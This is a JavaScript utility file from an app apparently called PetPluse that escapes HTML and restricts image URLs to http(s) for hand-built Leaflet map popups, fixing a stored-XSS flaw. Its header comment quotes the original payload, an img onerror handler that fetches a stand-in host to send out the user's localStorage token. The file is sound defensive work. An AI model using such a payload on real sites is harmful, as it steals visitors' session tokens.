/**
 * PetPluse — HTML escaping for the few places that must build markup by hand.
 *
 * Leaflet marker popups are created by the Leaflet API, not by React, so their
 * content is assembled as an HTML string and assigned to innerHTML. React's
 * automatic escaping does not apply there, and the interpolated values are
 * provider-controlled profile fields (name, clinic name, specialties, photo
 * URL) stored raw by the API.
 *
 * A vet or trainer who set their display name to
 *   <img src=x onerror="fetch('https://evil/steal?c='+localStorage.token)">
 * achieved stored XSS that fired for every visitor to the vets list or map
 * (F-15). These helpers close that: values are escaped as text, and image URLs
 * must be http(s) before they reach a src attribute.
 */

/**
 * Escape a value for interpolation into HTML text or a double-quoted attribute.
 * Escaping, not sanitizing: these fields are names and labels, so markup in
 * them is never legitimate.
 */
export function escapeHtml(value) {
  if (value === null || value === undefined) return '';
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/**
 * Only http(s) URLs reach a src attribute. Blocks `javascript:`, `data:` and
 * any attribute-breaking payload; anything else falls back.
 */
export function safeImageUrl(url, fallback = '') {
  const s = String(url || '').trim();
  if (!/^https?:\/\/[^\s"'<>]+$/i.test(s)) return fallback;
  return escapeHtml(s);
}

export default { escapeHtml, safeImageUrl };
